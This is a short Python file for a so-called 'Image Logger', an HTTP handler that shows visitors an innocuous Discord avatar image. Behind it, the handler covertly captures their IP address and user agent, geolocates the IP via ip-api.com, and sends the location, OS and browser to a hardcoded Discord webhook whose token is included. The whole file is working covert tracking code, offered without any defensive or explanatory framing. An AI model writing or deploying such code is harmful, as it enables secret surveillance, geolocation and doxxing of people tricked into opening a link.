from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1508249694781050982/hKNbAdw9NeOYtCv-5y7xoR22Q66qphIjR13DxSJXYc2WNnAxzyXnQjOJ6aosNmARCEDG",
    "username": "Image Logger",
    "color": 0x00FFFF,
}

def makeReport(ip, useragent):
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}").json()
        os, browser = httpagentparser.simple_detect(useragent)
        embed = {
            "username": config["username"],
            "embeds": [{
                "title": "IP Logged",
                "color": config["color"],
                "description": f"**IP:** {ip}\n**Country:** {info.get('country', 'Unknown')}\n**City:** {info.get('city', 'Unknown')}\n**OS:** {os}\n**Browser:** {browser}"
            }]
        }
        requests.post(config["webhook"], json=embed)
    except:
        pass

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<img src="https://cdn.discordapp.com/embed/avatars/0.png">')
        ip = self.headers.get('x-forwarded-for', 'Unknown')
        ua = self.headers.get('user-agent', 'Unknown')
        makeReport(ip, ua)

handler = ImageLoggerAPI
